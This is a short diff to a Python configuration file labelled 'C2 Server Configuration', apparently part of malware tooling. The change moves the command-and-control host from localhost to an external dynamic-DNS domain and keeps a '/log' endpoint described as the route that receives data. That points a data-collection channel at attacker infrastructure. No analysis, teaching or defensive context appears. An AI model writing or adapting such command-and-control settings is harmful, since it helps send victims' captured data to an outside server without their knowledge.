@@ -1,6 +1,6 @@
 # C2 Server Configuration
 import socket
-C2_HOST = "http://127.0.0.1"   
+C2_HOST = "retrodomain.duckdns.org"   
 C2_PORT = 5000                  # must match server.py
 C2_ENDPOINT = "/log"            # the route that receives data
 
